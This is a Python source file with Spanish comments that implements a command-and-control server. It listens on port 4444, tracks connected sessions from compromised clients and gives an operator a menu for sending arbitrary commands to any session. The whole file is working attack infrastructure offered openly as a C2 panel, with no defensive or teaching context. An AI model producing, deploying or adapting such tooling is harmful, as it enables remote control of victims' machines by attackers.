import socket
import threading
import time

# Lista para almacenar las sesiones activas
sesiones = []

# Módulo de conexión del servidor
def iniciar_servidor(host='0.0.0.0', puerto=4444):
    servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    servidor.bind((host, puerto))
    servidor.listen(5)
    print(f"[+] Servidor C2 escuchando en {host}:{puerto}")

    while True:
        cliente, direccion = servidor.accept()
        print(f"[+] Nueva conexión desde {direccion}")
        
        # Agregar la conexión a la lista de sesiones activas
        sesion_id = len(sesiones) + 1
        sesiones.append((sesion_id, cliente, direccion))
        print(f"[+] Sesión {sesion_id} añadida: {direccion}")
        
        # Crear un hilo para manejar la sesión
        threading.Thread(target=manejar_sesion, args=(sesion_id, cliente)).start()

# Módulo de gestión de sesiones
def manejar_sesion(sesion_id, cliente):
    while True:
        try:
            # Espera el mensaje del cliente
            mensaje = cliente.recv(1024).decode('utf-8')
            if mensaje:
                print(f"[Sesión {sesion_id}] {mensaje}")
            else:
                break
        except ConnectionResetError:
            print(f"[-] La sesión {sesion_id} se desconectó.")
            break

    # Cerrar la conexión de la sesión
    cliente.close()
    for sesion in sesiones:
        if sesion[0] == sesion_id:
            sesiones.remove(sesion)
            print(f"[+] Sesión {sesion_id} cerrada.")
            break

# Función para enviar comandos a una sesión específica
def enviar_comando(sesion_id, comando):
    for sesion in sesiones:
        if sesion[0] == sesion_id:
            cliente = sesion[1]
            cliente.send(comando.encode('utf-8'))
            print(f"[+] Comando enviado a la sesión {sesion_id}: {comando}")
            break
    else:
        print("[-] Sesión no encontrada.")

# Interfaz de usuario para el operador
def interfaz_operador():
    while True:
        print("\n1. Mostrar sesiones activas")
        print("2. Enviar comando a una sesión")
        print("3. Salir")
        opcion = input("\nSeleccione una opción: ")

        if opcion == '1':
            mostrar_sesiones()
        elif opcion == '2':
            try:
                sesion_id = int(input("Ingrese el ID de la sesión: "))
                comando = input("Ingrese el comando a enviar: ")
                enviar_comando(sesion_id, comando)
            except ValueError:
                print("[-] ID de sesión inválido.")
        elif opcion == '3':
            print("[+] Cerrando el panel de control.")
            break
        else:
            print("[-] Opción no válida.")

# Mostrar las sesiones activas
def mostrar_sesiones():
    print("\n[+] Sesiones Activas:")
    if sesiones:
        for sesion in sesiones:
            sesion_id, _, direccion = sesion
            print(f"ID: {sesion_id}, Dirección: {direccion}")
    else:
        print("[-] No hay sesiones activas.")
    print("\n")

# Iniciar el servidor y la interfaz de usuario
if __name__ == "__main__":
    threading.Thread(target=iniciar_servidor).start()
    time.sleep(1)  # Dar tiempo a que el servidor inicie
    interfaz_operador()
